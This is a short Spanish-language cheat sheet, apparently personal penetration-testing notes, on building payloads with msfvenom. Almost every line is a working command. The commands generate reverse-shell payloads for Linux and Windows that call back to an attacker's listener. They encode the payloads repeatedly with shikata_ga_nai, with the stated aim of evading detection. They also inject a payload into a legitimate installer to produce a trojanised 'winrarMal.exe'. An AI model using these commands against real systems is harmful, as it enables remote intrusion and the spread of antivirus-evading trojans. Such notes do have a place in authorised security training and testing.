Creación de payloads formateado en distintas extensiones (por ejemplo. `.exe`, `.aspx`, `.war`, `.py`)
msfvenom --list formats -> listar formatos disponibles 
msfvenom --list encoders 
	para usar en la creación del payload, se agrega -e ENCODER
		ej: ```   msfvenom -p linux/x86/shell_reverse_tcp -f war -o rev.war LHOST=192.168.179.131  LPORT=1234 -e x86/shikata_ga_nai ```
	se puede incrementar las iteraciones para hacer las dificil de detectar, agregando -i numero (recomendado maximo 10)
		ej: ```   msfvenom -p linux/x86/shell_reverse_tcp -f war -o rev.war LHOST=192.168.179.131  LPORT=1234 -e x86/shikata_ga_nai	-i 10  ```
	-x  wrar.exe (debe descargarse un ejecutable) -> inyecta ejecutable en un ejecutable
		ej: ```   msfvenom -p linux/x86/shell_reverse_tcp -f war  LHOST=192.168.179.131  LPORT=1234 -e x86/shikata_ga_nai	-i 10 -x  winrar.exe  -o winrarMal.exe ```
	-k -> permite conservar el funcionamiento del ejecutable (usando -x), no funciona muchas veces y puede ser detectado por antivirus

```
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o nombreSalida.exe LHOST=<listen-IP> LPORT=<listen-port>
```

ejemplo de salida servidor linux y archivo .war
```
msfvenom -p linux/x86/shell_reverse_tcp -f war -o rev.war LHOST=192.168.179.131  LPORT=1234
```

